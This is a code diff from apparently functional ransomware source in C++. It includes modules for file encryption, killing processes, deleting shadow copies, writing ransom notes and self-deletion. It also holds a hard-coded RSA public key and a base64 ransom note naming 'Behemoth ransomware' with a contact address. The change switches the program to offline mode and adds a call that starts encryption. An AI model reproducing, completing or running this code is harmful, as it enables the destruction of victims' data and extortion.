@@ -5,20 +5,21 @@
 #include <vector>
 #include <mutex>
 #include <algorithm>
+
 #include "Core/disk_id.h"
 #include "Core/file_search.h"
+#include "Core/file_enc.h"
+#include "Communication/sendrequest.h"
 #include "Helpers/convert_to_wstring.h"
 #include "Helpers/save_results.h"
 #include "Helpers/gen_str.h"
 #include "Helpers/kill_procs.h"
 #include "Helpers/del_shadows.h"
 #include "Helpers/json.hpp"
-#include "Core/file_enc.h"
 #include "Helpers/create_readmes.h"
 #include "Helpers/self_dest.h"
 #include "Helpers/desktop_path.h"
 #include "Helpers/profiler.h"
-#include "Communication/sendrequest.h"
 #include "Helpers/line_count.hpp"
 #include "Helpers/base64decode.hpp"
 
@@ -26,12 +27,12 @@
 std::string PUBLIC_KEY = "MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAydGwvuurofZFGQD6mDYPjq4JJDLGjiSBREcqAhb/2+njKYcJw4yyJlicn/vhDpiwoar2tMK0Ry1tY44hWjbrVBYNM+dav8qiTj9KtHyI9iZwqmZNU9hhlpKcYiirCYhS9d4GqDBTe/GciueB5rcI/0s8UAtkrHprJLGWHFo1RgooJxRcKnxhOS3Em+PYsenlrLgeCKKMMzn896pG5J6SI7K+bamgTu9d6Xi01ZFtN5glIQGspZd0guJOkVN2Gf0Lp8Yq/KA9rGQv7G8SlyQbyssDPVDXz/5fHuYOVedlseFllkNKEqfCPcvgp/Jrmr3h4D3s8avhrzAP2wJUXqRR+YwFLYHkglJ/zVubPqgtAJrb5VnbZeMLhyILbfEV8CW8ydpYMsmSeWuSFDz7z9Bg7EE6EFCZ4qx6vIzgNg/GOMsUyyarztnf/N9T2QWXbcex6/+c34kNO3y8aay1xkK8AAvk8bkOBWIEDS7bvJ7c0CYkZZehqSCJ/vkr706Ye27HAgMBAAE=";
 std::string README = "WW91ciBmaWxlcyBoYXMgYmVlbiBlbmNyeXB0ZWQgd2l0aCBCZWhlbW90aCByYW5zb213YXJlLgoKVGhlIGZpbGUgaGFzaCBmb3IgdGhpcyBleGVjdXRhYmxlIGlzIFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFgKCkNvbnN0YW50IHVzIGF0IGNvbnN0YW50QGMwbnN0YW50LmNhIHdpdGggdGhlIGV4ZWN1dGFibGUncyBoYXNoIHRvIGRlY3J5cHQgeW91ciBmaWxlcy4KCg==";
 
-bool ONLINE_ENC = true;
+bool ONLINE_ENC = false;
 int encryption();
 std::string C2_URL = "";                /// populate this with if statements inside main
 
 
-//
+
 int main() {
     
     if (ONLINE_ENC) {
@@ -46,7 +47,8 @@ int main() {
     }
 
     if (!ONLINE_ENC) {
-        // if offline encryption: begin offline encryption 
+        // if offline encryption: begin offline encryption & use hard-coded key and readme
+        encryption();
     }
     
 
